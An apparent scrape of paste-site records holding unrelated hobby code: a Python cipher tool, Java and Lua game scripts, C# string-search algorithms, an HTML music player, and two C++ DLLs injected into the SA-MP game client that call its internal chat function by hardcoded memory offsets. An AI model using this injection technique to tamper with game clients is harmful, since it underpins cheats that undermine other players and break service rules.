        mode (str): '1' for encoding, '2' for decoding.

    Returns:
        str: The encoded or decoded text.
    """"""
    result = """"
    for char in text:
        if char.isalpha():
            if mode == '1':  # Encode
                if char.islower():
                    result += chr((ord(char) - 97 + shift) % 26 + 97)
                else:
                    result += chr((ord(char) - 65 + shift) % 26 + 65)
            elif mode == '2':  # Decode
                if char.islower():
                    result += chr((ord(char) - 97 - shift) % 26 + 97)
                else:
                    result += chr((ord(char) - 65 - shift) % 26 + 65)
        else:
            result += char
    return result

# A1Z26 CIPHER
def a1z26_cipher(text, mode):
    """"""
    A1Z26 cipher encoding or decoding.

    Args:
        text (str): The text to be encoded or decoded.
        mode (str): '3' for encoding, '4' for decoding.

    Returns:
        str: The encoded or decoded text.
    """"""
    if mode == '3':    # ENCODE
        result = ' '.join(str(ord(char) - 96) if char.isalpha() else '0' for char in text)
    elif mode == '4':  # DECODE
        result = ''
        nums = text.split()
        for num in nums:
            if num == '0':
                result += ' '
            else:
                result += chr(int(num) + 96)
    else:
        result = ""\nInvalid mode! Please choose '3' for encoding or '4' for decoding.\n""
    return result

# ATBASH CIPHER
def atbash_cipher(text, mode):
    """"""
    Atbash cipher encoding or decoding.

    Args:
        text (str): The text to be encoded or decoded.
        mode (str): '5' for encoding, '6' for decoding.

    Returns:
        str: The encoded or decoded text.
    """"""
    result = """"
    for char in text:
        if char.isalpha():
            if char.islower():
                result += chr(122 - ord(char) + 97)
            else:
                result += chr(90 - ord(char) + 65)
        else:
            result += char
    return result

# RAILFENCE CIPHER (ENCODE)
def encode_RailFence(text, key):
    """"""
    Rail Fence cipher encoding.

    Args:
        text (str): The text to be encoded.
        key (int): The number of rails.

    Returns:
        str: The encoded text.
    """"""
    rail = [['\n' for i in range(len(text))] for j in range(key)]
    dir_down = False
    row, col = 0, 0
     
    for i in range(len(text)):
        if (row == 0) or (row == key - 1):
            dir_down = not dir_down
         
        rail[row][col] = text[i]
        col += 1
         
        if dir_down:
            row += 1
        else:
            row -= 1
    
    result = []
    for i in range(key):
        for j in range(len(text)):
            if rail[i][j] != '\n':
                result.append(rail[i][j])
    return ''.join(result)

# RAILFENCE CIPHER (DECODE)
def decode_RailFence(cipher, key):
    """"""
    Rail Fence cipher decoding.

    Args:
        cipher (str): The text to be decoded.
        key (int): The number of rails.

    Returns:
        str: The decoded text.
    """"""
    rail = [['\n' for i in range(len(cipher))] for j in range(key)]
    dir_down = None
    row, col = 0, 0
     
    for i in range(len(cipher)):
        if row == 0:
            dir_down = True
        if row == key - 1:
            dir_down = False
         
        rail[row][col] = '*'
        col += 1
         
        if dir_down:
            row += 1
        else:
            row -= 1
             
    index = 0
    for i in range(key):
        for j in range(len(cipher)):
            if (rail[i][j] == '*') and (index < len(cipher)):
                rail[i][j] = cipher[index]
                index += 1
         
    result = []
    row, col = 0, 0
    for i in range(len(cipher)):
        if row == 0:
            dir_down = True
        if row == key - 1:
            dir_down = False
             
        if rail[row][col] != '*':
            result.append(rail[row][col])
            col += 1
             
        if dir_down:
            row += 1
        else:
            row -= 1
    return ''.join(result)

# VIGENERE CIPHER
def vigenere_cipher(text, key, mode):
    """"""
    Vigenère cipher encoding or decoding.

    Args:
        text (str): The text to be encoded or decoded.
        key (str): The key for encoding or decoding.
        mode (str): '9' for encoding, '10' for decoding.

    Returns:
        str: The encoded or decoded text.
    """"""
    result = """"
    key_length = len(key)
    key_index = 0
    for char in text:
        if char.isalpha():
            if mode == '9':  # Encode
                if char.islower():
                    shift = ord(key[key_index].lower()) - 97
                    result += chr((ord(char) - 97 + shift) % 26 + 97)
                else:
                    shift = ord(key[key_index].lower()) - 97
                    result += chr((ord(char) - 65 + shift) % 26 + 65)
            elif mode == '10':  # Decode
                if char.islower():
                    shift = ord(key[key_index].lower()) - 97
                    result += chr((ord(char) - 97 - shift) % 26 + 97)
                else:
                    shift = ord(key[key_index].lower()) - 97
                    result += chr((ord(char) - 65 - shift) % 26 + 65)
            key_index = (key_index + 1) % key_length
        else:
            result += char
    return result

# PREPARE TEXT
def prepare_text(text):
    """"""
    Prepare text for encoding.

    Args:
        text (str): The text to be prepared.

    Returns:
        str: The prepared text.
    """"""
    # Remove non-alphabetic characters and convert to uppercase
    cleaned_text = ''.join(char.upper() for char in text if char.isalpha())
    # Replace 'J' with 'I'
    cleaned_text = cleaned_text.replace('J', 'I')
    return cleaned_text

# MAIN MENU & FUNCTION CALLS
def main():
    """"""
    Main function to run the cipher tool.
    """"""
    while True:
        print(""-"" * 28)
        print(Style.BRIGHT + Fore.GREEN + ""     :: CIPHER TOOL ::"" + Style.RESET_ALL)
        print(""-"" * 28)
        print(Style.BRIGHT +""\nCHOOSE A CIPHER TYPE:\n"" + Style.RESET_ALL)
        print(Style.BRIGHT + ""01. "" + Fore.GREEN + ""Caesar Encode        [+]"" + Style.RESET_ALL)
        print(Style.BRIGHT + ""02. "" + Fore.YELLOW + ""Caesar Decode        [-]"" + Style.RESET_ALL)
        print(Style.BRIGHT + ""03. "" + Fore.GREEN + ""A1Z26 Encode         [+]"" + Style.RESET_ALL)
        print(Style.BRIGHT + ""04. "" + Fore.YELLOW + ""A1Z26 Decode         [-]"" + Style.RESET_ALL)
        print(Style.BRIGHT + ""05. "" + Fore.GREEN + ""Atbash Encode        [+]"" + Style.RESET_ALL)
        print(Style.BRIGHT + ""06. "" + Fore.YELLOW + ""Atbash Decode        [-]"" + Style.RESET_ALL)
        print(Style.BRIGHT + ""07. "" + Fore.GREEN + ""Rail Fence Encode    [+]"" + Style.RESET_ALL)
        print(Style.BRIGHT + ""08. "" + Fore.YELLOW + ""Rail Fence Decode    [-]"" + Style.RESET_ALL)
        print(Style.BRIGHT + ""09. "" + Fore.GREEN + ""Vigenère Encode      [+]"" + Style.RESET_ALL)
        print(Style.BRIGHT + ""10. "" + Fore.YELLOW + ""Vigenère Decode      [-]"" + Style.RESET_ALL)
        print(Style.BRIGHT + ""0. "" + Fore.RED + ""Exit                  [!]"" + Style.RESET_ALL)

        choice = input(Style.BRIGHT +""\nEnter your choice (1-10)\nOr... type '0' to EXIT:  "" + Style.RESET_ALL)

        if choice == '1' or choice == '2':
            mode = choice
            text = input(""\nEnter the text: "")
            shift = int(input(""\nEnter the shift value: ""))
            print(""\nEncoded/Decoded text:"", caesar_cipher(text, shift, mode))
        elif choice == '3' or choice == '4':
            mode = choice
            if mode == '3':
                text = input(""\nEnter the plaintext to encode: "")
            else:
                text = input(""\nEnter the ciphertext to decode: "")
            print(""\nEncoded/Decoded text:"", a1z26_cipher(text, mode))
        elif choice == '5' or choice == '6':
            mode = choice
            if mode == '5':
                text = input(""\nEnter the plaintext to encode: "")
            else:
                text = input(""\nEnter the ciphertext to decode: "")
            print(""\nEncoded/Decoded text:"", atbash_cipher(text, mode))
        elif choice == '7':
            text = input(""\nEnter the plaintext to encode: "")
            key = int(input(""\nEnter the number of rails: ""))
            print(""\nEncoded text:"", encode_RailFence(text, key))
        elif choice == '8':
            text = input(""\nEnter the ciphertext to decode: "")
            key = int(input(""\nEnter the number of rails: ""))
            print(""\nDecoded text:"", decode_RailFence(text, key))
        elif choice == '9' or choice == '10':
            mode = choice
            if mode == '9':
                text = input(""\nEnter the plaintext to encode: "")
            else:
                text = input(""\nEnter the ciphertext to decode: "")
            key = input(""\nEnter the key: "")
            print(""\nEncoded/Decoded text:"", vigenere_cipher(text, key, mode))
        elif choice == '0':
            print()
            print(""-"" * 28)
            print(""Exiting Program...  Goodbye!"")
            print(""-"" * 28)
            break
        else:
            print(""\nInvalid choice! Please enter a number between 1 and 13.\n"")

if __name__ == ""__main__"":
    main()

"
pEG6Um3V,Untitled,tazerman2,JavaScript,Monday 6th of May 2024 05:57:46 PM CDT,"		if (actor.getTemplate().getAiType() == NpcAiType.MAGE && !actor.getCast().isCastingNow())
		{
			// This list is used in order to avoid multiple calls on skills lists. Tests are made one after the other, and content is replaced when needed.
			List<L2Skill> defaultList;
			
			// -------------------------------------------------------------------------------
			// Heal
			defaultList = actor.getTemplate().getSkills(NpcSkillType.HEAL);
			if (!defaultList.isEmpty())
			{
				Player leader = actor.getLeader();
				
				// Go through all characters around the actor that belongs to its faction.
				for (Creature cha : actor.getKnownTypeInRadius(Creature.class, 1000))
				{
					if (leader.getStatus().getHpRatio() < 0.75)
						cha = leader;
					else if (actor.getStatus().getHpRatio() < 0.75)
						cha = actor;
					else if (cha instanceof BodyGuard && ((BodyGuard) cha).getclans().getname() == leader.getName())
						
						// Will affect only defenders or NPCs from same faction.
						if (!actor.isAttackingDisabled())
						{
							for (L2Skill sk : defaultList)
							{
								System.out.println(""name:"" + cha.getName() + "" sk: "" + sk.getName());
								actor.getCast().doCast(sk, cha, actor.getActiveWeapon());
								return;
							}
						}
					
					leader.getClan().getName();
					
				}
			}"
Pcs1K0Di,CAAB Basalt coin gen,nauseant,Lua,Monday 6th of May 2024 05:41:28 PM CDT,"function voidInv()
    turtle.select(1)
    for i=1,16 do
        turtle.select(i)
        turtle.drop()
    end 
end

function isBasalt()
    local blockID
    local success, data = turtle.inspectDown()
    if success then
       blockID = data.name
    end
    
    if data.name == ""minecraft:basalt"" then
        return true
    else
        return false
    end
end

function mine()
    turtle.select(1)
    while not isBasalt() do
        turtle.select(1)
    end
    turtle.digDown()
end

function craft()
    local inv = {11, 12, 15, 16}
    for i=1,2 do
        turtle.transferTo(inv[1], 1)
        turtle.transferTo(inv[2], 1)
        turtle.transferTo(inv[3], 1)
        turtle.transferTo(inv[4], 1)
        turtle.craft()
    end
    
end

function uppies()
    turtle.select(1)
    turtle.dropUp()
end

local function main()
    while redstone.getInput(""back"") do
        for i = 1, 4 do
            mine()
        end
        craft()
        uppies()
    end
    os.pullEvent(""redstone"")
    voidInv()
end

voidInv()
while true do
    main()
end"
C1rapmRL,Untitled,Hidend,C++,Monday 6th of May 2024 05:08:57 PM CDT,"#include <Windows.h>

DWORD samp_base = 0;

const DWORD OFFSETS[6][2]{
    /*ChatInfo, AddMsg*/
    {0x21A0E4, 0x645A0}, // 037-r1 - 0
    {0x021A0EC, 0x64670}, // 037-r2 - 1
    {0x026E8C8, 0x679F0}, // 037-r3_1 - 2
    {0x026E9F8, 0x68130}, // 037-r4 - 3 
    {0x026E9F8, 0x68170}, // 037-r4_2 -4
    {0x026EB80, 0x68170}, // 037-r5_1 - 5
};

int get_samp_version_id()
{
    int version_current = -1;

    if (samp_base)
    {
        int* x = reinterpret_cast<int*>((char*)samp_base + 0x128);
        int version_id = *x;  // Directly dereference the pointer
        switch (version_id) {
        case 0x5542F47A: // 
            version_current = 0;
            break;
        case 0x59C30C94: // R2
            version_current = 1;
            break;

            version_id = *(DWORD*)(samp_base + 0x120);

            switch (version_id) {
            case 0x5C0B4243: // R3
                version_current = 2;
                break;
            case 0x5DD606CD: // R4 - v1
                version_current = 3;
                break;
            case 0x6094ACAB: // R4 - v2
                version_current = 4;
                break;
            case 0x6372C39E: // R5, ni nos interesa pero meh
                version_current = 5;
                break;
            }

        }
    }
    return version_current;
}

void addMessageToChat(unsigned dwColor, const char* szMsg, ...)
{
    int version = get_samp_version_id();
    if (version == -1)
        return;

    DWORD chatInfoOffset = OFFSETS[version][0];
    DWORD addMsgOffset = OFFSETS[version][1];

    auto addMessage = reinterpret_cast<void(__thiscall*)(void* pChat, unsigned color, const char* message)>(samp_base + addMsgOffset);
    addMessage(*reinterpret_cast<void**>(samp_base + chatInfoOffset), dwColor, szMsg);
}


int init()
{
    samp_base  = (DWORD)LoadLibraryA(""samp.dll"");
    while (true)
    {
        addMessageToChat(-1, ""Hidend // Shaarawy // <3"");
        Sleep(5000);
    }
    return true;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReasonForCall, LPVOID lpReserved)
{
	switch (dwReasonForCall)
	{
	case DLL_PROCESS_ATTACH:
        CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)init, NULL, NULL, NULL);
		break;
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}"
3jw53sdS,Untitled,Hidend,C++,Monday 6th of May 2024 05:03:52 PM CDT,"//hidend
#include <Windows.h>
#include <d3d9.h>
#include <cstdio>
#include <iostream>

uint32_t samp_base = 0;

const DWORD OFFSETS[6][2]{
    /*ChatInfo, AddMsg*/
    {0x21A0E4, 0x645A0}, // 037-r1 - 0
    {0x021A0EC, 0x64670}, // 037-r2 - 1
    {0x026E8C8, 0x679F0}, // 037-r3_1 - 2
    {0x026E9F8, 0x68130}, // 037-r4 - 3 
    {0x026E9F8, 0x68170}, // 037-r4_2 -4
    {0x026EB80, 0x68170}, // 037-r5_1 - 5
};

int get_samp_version_id()
{
    int version_current = -1;

    if (samp_base)
    {
        std::cout << ""Dentro!"" << std::endl;
        int* x = reinterpret_cast<int*>((char*)samp_base + 0x128);
        int version_id = *x;  // Directly dereference the pointer
        std::cout << ""Version1: "" << version_id << std::endl;
        switch (version_id) {
        case 0x5542F47A: // 
            std::cout << ""Hit!"" << version_id << std::endl;
            version_current = 0;
            break;
        case 0x59C30C94: // R2
            version_current = 1;
            break;

            version_id = *(DWORD*)(samp_base + 0x120);

            switch (version_id) {
            case 0x5C0B4243: // R3
                version_current = 2;
                break;
            case 0x5DD606CD: // R4 - v1
                version_current = 3;
                break;
            case 0x6094ACAB: // R4 - v2
                version_current = 4;
                break;
            case 0x6372C39E: // R5, ni nos interesa pero meh
                version_current = 5;
                break;
            }

        }
    }
    return version_current;
}

void addMessageToChat(D3DCOLOR dwColor, const char* szMsg, ...)
{
    int version = get_samp_version_id();
    std::cout << ""Version2: "" << version << std::endl;
    if (version == -1)
        return;

    DWORD chatInfoOffset = OFFSETS[version][0];
    DWORD addMsgOffset = OFFSETS[version][1];

    std::cout << ""chatInfoOffset: "" << chatInfoOffset << std::endl;
    std::cout << ""addMsgOffset: "" << addMsgOffset << std::endl;
    auto addMessage = reinterpret_cast<void(__thiscall*)(void* pChat, unsigned color, const char* message)>(samp_base + addMsgOffset);
    addMessage(*reinterpret_cast<void**>(samp_base + chatInfoOffset), dwColor, szMsg);
}


int init()
{
    std::cout << ""init"" << std::endl;
    samp_base  = (DWORD)LoadLibraryA(""samp.dll"");
    while (true)
    {
        addMessageToChat(-1, ""Hidend // Shaarawy // <3"");
        Sleep(5000);
    }
    return true;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReasonForCall, LPVOID lpReserved)
{
	switch (dwReasonForCall)
	{
	case DLL_PROCESS_ATTACH:
        AllocConsole();
        freopen(""CONOUT$"", ""w"", stdout);
        std::cout << ""injected"" << std::endl;
        CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)init, NULL, NULL, NULL);
		break;
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}"
E2acK7VQ,knuth morris pratt algorithm c#,Pearlfromsu,C#,Monday 6th of May 2024 05:01:10 PM CDT,"using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;

namespace ClassLibrary1
{
    public class KnutMorrisPratt : ISubstringSearch {
        int[] PrefixFunctionFast(string str)
        {
            int[] result = new int[str.Length];
            result[0] = 0;
            for (int i = 1; i < str.Length; i++)
            {
                int k = result[i - 1];
                while (k > 0 && str[k] != str[i])
                {
                    k = result[k - 1];
                }
                if (str[k] == str[i])
                {
                    k++;
                }
                result[i] = k;
            }
            return result;
        }
        int[] PrefixFunction(string str) {
            int n = str.Length;
            int[] p = new int[n];
            for (int i = 0; i < n; i++)
            {
                for (int k = 0; k < i; k++)
                {
                    bool fl = true;
                    for (int j = 0; j < k + 1; j++)
                    {
                        if (str[j] != str[i - k + j])
                        {
                            fl = false;
                            break;
                        }
                    }
                    if (fl)
                        p[i] = (byte)(k + 1);
                }
            }               
            return p;
        }
        public List<int> FindAll(string text, string substring) {
            List<int> res = new List<int>();
            int[] prefix_sub = PrefixFunctionFast(substring);
            int k = 0;
            for(int i = 0; i < text.Length; i++) 
            {
                while (k > 0 && substring[k] != text[i]) { k = prefix_sub[k - 1]; }
                if (substring[k] == text[i]) k++;
                if (k == substring.Length)
                {
                    res.Add(i - k + 1);
                    k = prefix_sub[k - 1];
                }
            }
            return res;
        }
    }
}
"
RxtdGjQ0,boyer moore algorithm c#,Pearlfromsu,C#,Monday 6th of May 2024 04:56:19 PM CDT,"using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace ClassLibrary1
{
    public class Mur : ISubstringSearch {

        public List<int> FindAll(string text, string substring)
        {
            List<int> res = new List<int>();
            char[] pattern = substring.ToCharArray();
            char[] textChAr = text.ToCharArray();
            if (pattern.Length > textChAr.Length)
            {
                return res;
            }
            byte[] StopSymbols = BuildStopCharTable(pattern);
            byte[] Suffixes = BuildSuffixTable(pattern);
            int offset = 0;
            int scan;
            int last = pattern.Length - 1;
            int maxoffset = textChAr.Length - pattern.Length;
            while (offset <= maxoffset)
            {
                scan = last;
                bool fl = true;
                while (pattern[scan] == textChAr[scan + offset])
                {
                    scan--;
                    if (scan < 0)
                    {
                        res.Add(offset);
                        fl = false;
                        offset += Math.Max(StopSymbols[textChAr[offset + last]], Suffixes[pattern.Length]);
                        break;
                    }
                }
                if (fl)
                    offset += Math.Max(StopSymbols[textChAr[offset + last]], Suffixes[scan + 1]);               
            }
            return res;
        }
        private static byte[] BuildStopCharTable(char[] pattern)
        {
            byte[] StopSymbols = new byte[0x10000];
            for (int i = 0; i < StopSymbols.Length; i++)
            {
                StopSymbols[i] = (byte)pattern.Length;
            }
            int last = pattern.Length - 1;
            for (int i = 0; i < last; i++)
            {
                StopSymbols[pattern[i]] = (byte)(last - i);
            }
            return StopSymbols;
        }
        private byte[] BuildSuffixTable(char[] pattern)
        {
            byte[] suffixes = new byte[pattern.Length + 1];
            for (int i = 0; i < pattern.Length; i++)
            {
                suffixes[i] = (byte)pattern.Length;
            }
            suffixes[pattern.Length] = 1;
            StringBuilder sb1 = new StringBuilder();
            StringBuilder sb2 = new StringBuilder();
            for (int i = pattern.Length - 1; i >= 0; i--)
            {
                for (int at = i; at < pattern.Length; at++)
                {
                    for (int k = at; k < pattern.Length; k++)
                    {
                        sb1.Append(pattern[k]);
                    }
                    for (int j = at - 1; j >= 0; j--)
                    {
                        for (int k = j; k < j + sb1.Length; k++)
                        {
                            sb2.Append(pattern[k]);
                        }
                        bool fl = true;
                        for (int k = 0; k < sb1.Length; k++)
                        {
                            if (sb1[k] != sb2[k])
                            {
                                fl = false;
                                break;
                            }
                        }
                        if (fl)
                        {
                            suffixes[i] = (byte)(at - j);
                            sb2.Clear();
                            break;
                        }
                        sb2.Clear();
                    }
                    sb1.Clear();
                }
            }
            return suffixes;
        }
    }
}
    "
pGKbzGW6,"03. Hwei, The Visionary | Reproductor de Música Móvil",Athenea-Owl,HTML,Monday 6th of May 2024 04:55:10 PM CDT,"---------HWEI, THE VISIONARY | REPRODUCTOR DE MÚSICA MÓVIL PARA FORO MODERNBB----------

<center><div class=""atherp3""><div class=""atherp3ic""><i class=""fas fa-signal""></i><i class=""fas fa-wifi""></i><div class=""athec3""><a href=""https://athenea-owl.tumblr.com""><img src=""https://i.servimg.com/u/f81/19/51/91/06/logoat10.png""/></a></div><i class=""fas fa-battery-three-quarters"" style=""margin-left: 170px;""></i> 4:06 </div><div class=""atherp3i""><div class=""atherp3img"" style=""background-image: url(https://i.servimg.com/u/f81/19/51/91/06/78c85910.jpg);""></div>
<b>Hwei, The Visionary</b>
<span>League Of Legends</span>
<div class=""atherp3l"">Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.
</div><audio src=""https://dl.dropboxusercontent.com/scl/fi/tzvb57b5uq04iqc0u6ilg/x2mate.com-Hwei-Champion-Theme-_-League-of-Legends-320-kbps.mp3?rlkey=3qw6y4xa7dg4fj5vt765ulwb9&"" controls=""controls"" type=""audio/mpeg"" preload=""preload""></audio></div></div></center>

<style>.atherp3{--3fondo: black;--3fondo2: linear-gradient(0deg, rgba(45,253,118,1) 0%, rgba(0,113,61,1) 50%);--3iconos: --white;--3titulo: black;--3artista: white;--3repro: #26e76d;--3lyric: white;}</style>
<link rel=""stylesheet""href=""https://use.fontawesome.com/releases/v5.12.1/css/all.css"" crossorigin=""anonymous""><link rel=""stylesheet"" href=""https://dl.dropboxusercontent.com/scl/fi/b672953ntlm9n3lc8m396/03.-Hwei-The-Visionary-Reproductor-de-musica-Modernbb.css?rlkey=zo802gwa7p3zjbawkbm1188gq&st=fl4qufir&"" crossorigin=""anonymous"">


---------HWEI, THE VISIONARY | REPRODUCTOR DE MÚSICA MÓVIL PARA FORO PHPBB----------

<center><div class=""atherp3""><div class=""atherp3ic""><i class=""fas fa-signal""></i><i class=""fas fa-wifi""></i><div class=""athec3""><a href=""https://athenea-owl.tumblr.com""><img src=""https://i.servimg.com/u/f81/19/51/91/06/logoat10.png""/></a></div><i class=""fas fa-battery-three-quarters"" style=""margin-left: 170px;""></i> 4:06 </div><div class=""atherp3i""><div class=""atherp3img"" style=""background-image: url(https://i.servimg.com/u/f81/19/51/91/06/78c85910.jpg);""></div>
<b>Hwei, The Visionary</b>
<span>League Of Legends</span>
<div class=""atherp3l"">Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.
</div><audio src=""https://dl.dropboxusercontent.com/scl/fi/tzvb57b5uq04iqc0u6ilg/x2mate.com-Hwei-Champion-Theme-_-League-of-Legends-320-kbps.mp3?rlkey=3qw6y4xa7dg4fj5vt765ulwb9&"" controls=""controls"" type=""audio/mpeg"" preload=""preload""></audio></div></div></center>

<style>.atherp3{--3fondo: black;--3fondo2: linear-gradient(0deg, rgba(45,253,118,1) 0%, rgba(0,113,61,1) 50%);--3iconos: white;--3titulo: black;--3artista: white;--3repro: #26e76d;--3lyric: white;}</style>
<link rel=""stylesheet"" href=""https://use.fontawesome.com/releases/v5.12.1/css/all.css"" crossorigin=""anonymous""><link rel=""stylesheet"" href=""https://dl.dropboxusercontent.com/scl/fi/mcdjapyhr4hy4hk9xo63t/03.-Hwei-The-Visionary-Reproductor-de-musica-Phpbb.css?rlkey=01lizsvgl3xyf1fvpvtv3qjnb&st=nnmcq1gr&"" crossorigin=""anonymous"">
"
